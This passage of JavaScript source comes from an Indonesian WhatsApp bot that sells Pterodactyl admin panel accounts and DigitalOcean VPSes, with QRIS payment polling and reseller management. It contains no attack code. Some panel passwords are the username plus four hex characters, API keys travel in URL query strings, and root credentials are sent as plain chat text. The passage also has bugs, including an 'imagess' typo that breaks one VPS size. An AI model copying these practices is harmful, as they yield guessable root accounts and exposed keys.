‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎

*Berhasil Membuat Admin Panel*

* *ID User :* ${user.id}
* *Nama :* ${user.first_name} ${user.last_name}
* *username :* ${user.username}
* *pasword :* ${password.toString()}
* *login :* ${global.domain}

❏▭▬▭▬▭▬▭▬▭▬▭▬▭▬
╎ *MASA AKTIF* = 30 HARI
╎ *GARANSI* = 10 HARI
╎ *TUTOR* = ${linktutor}
╎ *SOSMED* = ${sosmed}
❏▭▬▭▬▭▬▭▬▭▬▭▬▭▬

*Rules Admin Panel ⚠️*
* dilarang intip panel orang
* dilarang otak atik panel
* dilarang ganti nama panel
* dilarang ambil sc orang
* dilarang create admin panel
* dilarang otak atik nodejs
* dilarang otak atik apa pun
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian.
KALO GA PAHAM, LIAT YT, JANGAN NEKAT 
BIKIN ASAL ASALAN. KARENA KALO SALAH,
BAKALAN DI DELETE. TRX NO REFF NO DRAMA


*NOTE* :
*OWNER HANYA MENGIRIM 1X DATA AKUN ANDA. MOHON DI SIMPAN BAIK BAIK. KALAU DATA AKUN ANDA HILANG. OWNER TIDAK DAPAT MENGIRIM AKUN ANDA LAGI*

`,
})
} 
        break

//================================================================================

case "cadmin-v2": {
if (!isCreator) return reply(mess.owner)
if (!text) return reply(example("username"))
let username = text.toLowerCase()
let email = username+"@gmail.com"
let name = capital(args[0])
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domainV2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var orang
if (m.isGroup) {
orang = m.sender
await reply("*Berhasil membuat admin panel*\nData akun sudah di kirim ke private chat")
} else {
orang = m.chat
}
var teks = `
*Berhasil Membuat Admin Panel*

* *ID User :* ${user.id}
* *Nama :* ${user.first_name}
* *Username :* ${user.username}
* *Password :* ${password.toString()}
* *Login :* ${global.domainV2}

*Rules Admin Panel ⚠️*
* Jangan Maling SC, Ketahuan Maling ? Auto Delete Akun & No Reff!!
* Simpan Baik² Data Akun Ini
* Buat Panel Seperlunya Aja, Jangan Asal Buat!
* Garansi Aktif 10 Hari
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
await client.sendMessage(orang, {text: teks}, {quoted: loli})
}
break

case "cadmin1-v2": {
if (!isCreator) return reply(mess.owner)
let s = q.split(',')
let email = s[0];
let username = s[0]
let nomor = s[1]
if (s.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix+command} user,nomer`)
if (!username) return reply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
if (!nomor) return reply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
let password = username+crypto.randomBytes(2).toString('hex')
let nomornya = nomor.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
let f = await fetch(domainV2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
},
"body": JSON.stringify({
"email": username + "@gmail.com",
"username": username,
"first_name": username,
"last_name": "Memb",
"language": "en",
 "root_admin" : true,  
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let tks = `
*Succesfully Created Akun Admin Panel*\nData Akun Sudah Dikirim Ke Nomor ${nomornya}
`
    const listMessage = {
        text: tks,
    }
    await client.sendMessage(m.chat, listMessage)
    await client.sendMessage(nomornya, {
        text: `*PERMISI PESANAN ADP ANDA TELAH SAMPAI 📦*
‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎

*Berhasil Membuat Admin Panel*

* *ID User :* ${user.id}
* *Nama :* ${user.first_name} ${user.last_name}
* *username :* ${user.username}
* *pasword :* ${password.toString()}
* *login :* ${global.domainV2}

❏▭▬▭▬▭▬▭▬▭▬▭▬▭▬
╎ *MASA AKTIF* = 30 HARI
╎ *GARANSI* = 10 HARI
╎ *TUTOR* = ${linktutor}
╎ *SOSMED* = ${sosmed}
❏▭▬▭▬▭▬▭▬▭▬▭▬▭▬

*Rules Admin Panel ⚠️*
* dilarang intip panel orang
* dilarang otak atik panel
* dilarang ganti nama panel
* dilarang ambil sc orang
* dilarang create admin panel
* dilarang otak atik nodejs
* dilarang otak atik apa pun
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian.
KALO GA PAHAM, LIAT YT, JANGAN NEKAT 
BIKIN ASAL ASALAN. KARENA KALO SALAH,
BAKALAN DI DELETE. TRX NO REFF NO DRAMA


*NOTE* :
*OWNER HANYA MENGIRIM 1X DATA AKUN ANDA. MOHON DI SIMPAN BAIK BAIK. KALAU DATA AKUN ANDA HILANG. OWNER TIDAK DAPAT MENGIRIM AKUN ANDA LAGI*

`,
})
} 
        break

//================================================================================

case "addrespon": {
if (!isCreator) return reply(mess.owner)
if (!text) return reply(example("cmd|responnya"))
if (!text.split("|")) return reply(example("cmd|responnya"))
let result = text.split("|")
if (result.length < 2) return reply(example("cmd|responnya"))
const [ cmd, respon ] = result
let res = list.find(e => e.cmd == cmd.toLowerCase())
if (res) return reply("Cmd respon sudah ada")
let obj = {
cmd: cmd.toLowerCase(), 
respon: respon
}
list.push(obj)
fs.writeFileSync("./storage/database/list.json", JSON.stringify(list, null, 2))
reply(`Berhasil menambah cmd respon *${cmd.toLowerCase()}* kedalam database respon`)
}
break

//================================================================================

case "delrespon": {
if (!isCreator) return reply(mess.owner)
if (!text) return reply(example("cmd\n\n ketik *.listrespon* untuk melihat semua cmd"))
const cmd = text.toLowerCase()
let res = list.find(e => e.cmd == cmd.toLowerCase())
if (!res) return reply("Cmd respon tidak ditemukan\nketik *.listrespon* untuk melihat semua cmd respon")
let position = list.indexOf(res)
await list.splice(position, 1)
fs.writeFileSync("./storage/database/list.json", JSON.stringify(list, null, 2))
reply(`Berhasil menghapus cmd respon *${cmd.toLowerCase()}* dari database respon`)
}
break

//================================================================================

case "listrespon": {
if (!isCreator) return reply(mess.owner)
if (list.length < 1) return reply("Tidak ada cmd respon")
let teks = "\n *[ ! ] List all cmd response*\n"
await list.forEach(e => teks += `\n* *Cmd :* ${e.cmd}\n`)
reply(`${teks}`)
}
break

//================================================================================

case "addseller": {
if (!isCreator) return reply(mess.owner)
if (!text && !m.quoted) return reply(`\`Example:\` : ${prefix+command} 628×××`)
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || seller.includes(input) || input === botNumber) return reply(`Nomor ${input2} sudah menjadi reseller!`)
seller.push(input)
await fs.writeFileSync("./storage/database/reseller.json", JSON.stringify(seller, null, 2))
reply(`Succesfully Add Reseller`)
}
break

case "addseller-v2": {
if (!isCreator) return reply(mess.owner)
if (!text && !m.quoted) return reply(`\`Example:\` : ${prefix+command} 628×××`)
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || sellerr.includes(input) || input === botNumber) return reply(`Nomor ${input2} sudah menjadi reseller!`)
sellerr.push(input)
await fs.writeFileSync("./storage/database/resellerr.json", JSON.stringify(sellerr, null, 2))
reply(`Succesfully Add Reseller`)
}
break

//================================================================================

case "listseller": {
if (!isCreator) return reply(mess.owner)
if (seller.length < 1) return reply("Tidak ada user reseller")
let teks = `\n *🌟 List all reseller panel*\n`
for (let i of seller) {
teks += `\n* ${i.split("@")[0]}
* *Tag :* @${i.split("@")[0]}\n`
}
client.sendMessage(m.chat, {text: teks, mentions: seller}, {quoted: loli})
}
break

case "listseller-v2": {
if (!isCreator) return reply(mess.owner)
if (sellerr.length < 1) return reply("Tidak ada user reseller server 2")
let teks = `\n *🌟 List all reseller panel v2*\n`
for (let i of sellerr) {
teks += `\n* ${i.split("@")[0]}
* *Tag :* @${i.split("@")[0]}\n`
}
client.sendMessage(m.chat, {text: teks, mentions: sellerr}, {quoted: loli})
}
break

//================================================================================

case "delseller": {
if (!isCreator) return reply(mess.owner)
if (!m.quoted && !text) return reply(`\`Example:\` : ${prefix+command} 628×××`)
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 == global.owner || input == botNumber) return reply(`Tidak bisa menghapus owner!`)
if (!seller.includes(input)) return reply(`Nomor ${input2} bukan reseller!`)
let posi = seller.indexOf(input)
await seller.splice(posi, 1)
await fs.writeFileSync("./storage/database/reseller.json", JSON.stringify(seller, null, 2))
reply(`Succesfully Delete Reseller`)
}
break

case "delseller-v2": {
if (!isCreator) return reply(mess.owner)
if (!m.quoted && !text) return reply(`\`Example:\` : ${prefix+command} 628×××`)
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 == global.owner || input == botNumber) return reply(`Tidak bisa menghapus owner!`)
if (!sellerr.includes(input)) return reply(`Nomor ${input2} bukan reseller!`)
let posi = sellerr.indexOf(input)
await sellerr.splice(posi, 1)
await fs.writeFileSync("./storage/database/resellerr.json", JSON.stringify(sellerr, null, 2))
reply(`Succesfully Delete Reseller`)
}
break

//================================================================================




case "buyvps": {
if (m.isGroup) return reply("Pembelian vps hanya bisa di dalam private chat")
if (db.users[m.sender].status_deposit) return reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")

if (!text) return client.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Spesifikasi Vps',
          sections: [
            {
              title: 'List Ram Vps',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'Ram 16 & Cpu 4', 
                  description: "Rp60.000", 
                  id: '.buyvps 4'
                },
                {
                  title: 'Ram 2 & Cpu 1', 
                  description: "Rp30.000", 
                  id: '.buyvps 1'
                },
                {
                  title: 'Ram 4 & Cpu 2', 
                  description: "Rp40.000", 
                  id: '.buyvps 2'
                },
                {
                  title: 'Ram 8 & Cpu 4', 
                  description: "Rp50.000", 
                  id: '.buyvps 3'
                }                       
              ]
            }
          ]
        })
      }
      }
  ],
  footer: `${global.botname2}\nAuto Order Vps`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Ram Server Vps Yang Tersedia\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: loli})
tek = text.toLowerCase()
let Obj = {}

    if (tek == "1") {
    Obj.images = "s-1vcpu-2gb"
    Obj.harga = "30000"
    } else if (tek == "2") {
    Obj.images = "s-2vcpu-4gb"
    Obj.harga = "40000"
    } else if (tek == "3") {
    Obj.imagess = "s-4vcpu-8gb"
    Obj.harga = "50000"
    } else if (tek == "4") {
    Obj.images = "s-4vcpu-16gb"
    Obj.harga = "60000"
    } else return reply(teks)
    
const UrlQr = global.qrisOrderKuota

const amount  = Number(Obj.harga) + generateRandomNumber(110, 250)
const get = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/createpayment?apikey=${global.apipayment2}&amount=${amount}&codeqr=${global.QrisOrderKuota}`)
const teks3 = `
*INFORMASI PEMBAYARAN*
  
 *• ID :* ${get.data.result.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
 *• Barang :* Vps Digital Ocean
 *• Expired :* 5 menit

*Note :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.

Ketik *.batalbeli* untuk membatalkan
`
let msgQr = await client.sendMessage(m.chat, {
  footer: `${botname2}\nAuto Order Vps`,
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.qrImageUrl}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender]
  },
})
db.users[m.sender].status_deposit = true
db.users[m.sender].saweria = {
msg: msgQr, 
chat: m.sender,
idDeposit: get.data.result.transactionId, 
amount: get.data.result.amount.toString(), 
exp: function () {
setTimeout(async () => {
if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount == db.users[m.sender].saweria.amount) {
await client.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg})
await client.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
}
}, 300000)
}
}

await db.users[m.sender].saweria.exp()
while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await sleep(8000)
const resultcek = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/cekstatus?apikey=${global.apipayment2}&merchant=${global.IdMerchant}&keyorkut=${global.ApikeyOrderKuota}`)
const req = await resultcek.data
if (db.users[m.sender].saweria && req?.amount == db.users[m.sender].saweria.amount) {
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
await client.sendMessage(db.users[m.sender].saweria.chat, {text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• ID :* ${db.users[m.sender].saweria.idDeposit}
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *• Barang :* Vps Digital Ocean
`}, {quoted: db.users[m.sender].saweria.msg})
var orang = db.users[m.sender].saweria.chat
    let hostname = "#" + m.sender.split("@")[0]
    
    try {        
        let dropletData = {
            name: hostname,
            region: "sgp1", 
            size: Obj.images,
            image: 'ubuntu-20-04-x64',
            ssh_keys: null,
            backups: false,
            ipv6: true,
            user_data: null,
            private_networking: null,
            volumes: null,
            tags: ['T']
        };

        let password = await generateRandomPassword()
        dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

        let response = await fetch('https://api.digitalocean.com/v2/droplets', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': "Bearer " + global.apiDigitalOcean 
            },
            body: JSON.stringify(dropletData)
        });

        let responseData = await response.json();

        if (response.ok) {
            let dropletConfig = responseData.droplet;
            let dropletId = dropletConfig.id;

            // Menunggu hingga VPS selesai dibuat
            await reply(`Memproses pembuatan vps...`);
            await new Promise(resolve => setTimeout(resolve, 60000));

            // Mengambil informasi lengkap tentang VPS
            let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
                method: 'GET',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': "Bearer " + global.apiDigitalOcean
                }
            });

            let dropletData = await dropletResponse.json();
            let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 
                ? dropletData.droplet.networks.v4[0].ip_address 
                : "Tidak ada alamat IP yang tersedia";

            let messageText = `VPS berhasil dibuat!\n\n`;
            messageText += `ID: ${dropletId}\n`;
            messageText += `IP VPS: ${ipVPS}\n`;
            messageText += `Password: ${password}`;

            await client.sendMessage(orang, { text: messageText });
        } else {
            throw new Error(`Gagal membuat VPS: ${responseData.message}`);
        }
    } catch (err) {
        console.error(err);
        reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
    }
await client.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
delete db.users[m.sender].saweria
}
}

}
break





//================================================================================



case "buyadp": {
if (m.isGroup) return reply("Pembelian panel pterodactyl hanya bisa di dalam private chat")
if (db.users[m.sender].status_deposit) return reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")
let us = crypto.randomBytes(4).toString('hex')
let Obj = {}
Obj.harga = "20000" 
Obj.username = us
const UrlQr = global.qrisOrderKuota

const amount  = Number(Obj.harga) + generateRandomNumber(110, 250)
const get = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/createpayment?apikey=${global.apipayment2}&amount=${amount}&codeqr=${global.QrisOrderKuota}`)
const teks3 = `
*INFORMASI PEMBAYARAN*
  
 *• ID :* ${get.data.result.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
 *• Barang :* Admin Panel Pterodactyl
 *• Expired :* 5 menit

*Note :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.

Ketik *.batalbeli* untuk membatalkan
`
let msgQr = await client.sendMessage(m.chat, {
  footer: `${global.botname2}\nAuto Order Adp`,
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.qrImageUrl}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender]
  },
})
db.users[m.sender].status_deposit = true
db.users[m.sender].saweria = {
msg: msgQr, 
chat: m.sender,
idDeposit: get.data.result.transactionId, 
amount: get.data.result.amount.toString(), 
exp: function () {
setTimeout(async () => {
if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount == db.users[m.sender].saweria.amount) {
await client.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg})
await client.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
}
}, 300000)
}
}

await db.users[m.sender].saweria.exp()

while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await sleep(8000)
const resultcek = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/cekstatus?apikey=${global.apipayment2}&merchant=${global.IdMerchant}&keyorkut=${global.ApikeyOrderKuota}`)
const req = await resultcek.data
if (db.users[m.sender].saweria && req?.amount == db.users[m.sender].saweria.amount) {
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
await client.sendMessage(db.users[m.sender].saweria.chat, {text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• ID :* ${db.users[m.sender].saweria.idDeposit}
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *• Barang :* Admin Panel Pterodactyl
`}, {quoted: db.users[m.sender].saweria.msg})
let username = Obj.username
let email = username+"@gmail.com"
let name = capital(username)
let password = crypto.randomBytes(4).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var teks = `*Data Akun Admin Panel Anda*

*📡 ID User (${user.id})* 
*👤 Username :* ${user.username}
*🔐 Password :* ${password.toString()}
* ${global.domain}

*Syarat & Ketentuan :*
* Expired akun 1 bulan
* Simpan data ini sebaik mungkin
* Jangan asal hapus server!
* Ketahuan maling sc, auto delete akun no reff!
`
await fs.writeFileSync("./akunpanel.txt", teks)
await client.sendMessage(db.users[m.sender].saweria.chat, {document: fs.readFileSync("./akunpanel.txt"), fileName: "akunpanel.txt", mimetype: "text/plain", caption: teks}, {quoted: loli})
await fs.unlinkSync("./akunpanel.txt")
await client.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
delete db.users[m.sender].saweria
}
}

}
break

//================================================================================

case "batalbeli": {
if (m.isGroup) return
if (db.users[m.sender].status_deposit == false) return 
db.users[m.sender].status_deposit = false
if ('saweria' in db.users[m.sender]) {
await client.sendMessage(m.chat, {text: "Berhasil membatalkan pembelian"}, {quoted: db.users[m.sender].saweria.msg})
await client.sendMessage(m.chat, { delete: db.users[m.sender].saweria.msg.key })
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
} else {
return reply("Berhasil membatalkan pembelian")
}
}
break

//================================================================================

case 'listdroplet': {
if (!isCreator) return reply(mess.owner)
try {
const getDroplets = async () => {
try {
const response = await fetch('https://api.digitalocean.com/v2/droplets', {
headers: {
Authorization: "Bearer " + global.apidigitalocean
}
});
const data = await response.json();
return data.droplets || [];
} catch (err) {
reply('Error fetching droplets: ' + err);
return [];
}
};

getDroplets().then(droplets => {
let totalvps = droplets.length;
let mesej = `List droplet digital ocean kamu: ${totalvps}\n\n`;

if (droplets.length === 0) {
mesej += 'Tidak ada droplet yang tersedia!';
} else {
droplets.forEach(droplet => {
const ipv4Addresses = droplet.networks.v4.filter(network => network.type === "public");
const ipAddress = ipv4Addresses.length > 0 ? ipv4Addresses[0].ip_address : 'Tidak ada IP!';
mesej += `Droplet ID: ${droplet.id}
Hostname: ${droplet.name}
Username: Root
IP: ${ipAddress}
Ram: ${droplet.memory} MB
Cpu: ${droplet.vcpus} CPU
OS: ${droplet.image.distribution}
Storage: ${droplet.disk} GB
Status: ${droplet.status}\n`;
});
}
client.sendMessage(m.chat, { text: mesej }, {quoted: loli});
});
} catch (err) {
reply('Terjadi kesalahan saat mengambil data droplet: ' + err);
}
}
break

//================================================================================

case 'restartvps': {
if (!isCreator) return reply(mess.owner)
if (!text) return reply(example("iddroplet"))
let dropletId = text
const restartVPS = async (dropletId) => {
try {
const apiUrl = `https://api.digitalocean.com/v2/droplets/${dropletId}/actions`;

const response = await fetch(apiUrl, {
method: 'POST',
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${global.apidigitalocean}`
},
body: JSON.stringify({
type: 'reboot'
})
});

if (response.ok) {
const data = await response.json();
return data.action;
} else {
const errorData = await response.json();
reply(`Gagal melakukan restart VPS: ${errorData.message}`);
}
} catch (err) {
reply('Terjadi kesalahan saat melakukan restart VPS: ' + err);
}
};

restartVPS(dropletId)
.then((action) => {
reply(`Aksi restart VPS berhasil dimulai. Status aksi: ${action.status}`);
})
.catch((err) => {
reply(err);
})

}
break

//================================================================================

case 'rebuild': {
if (!isCreator) return reply(mess.owner)
if (!text) return reply(example("iddroplet"))
let dropletId = text 
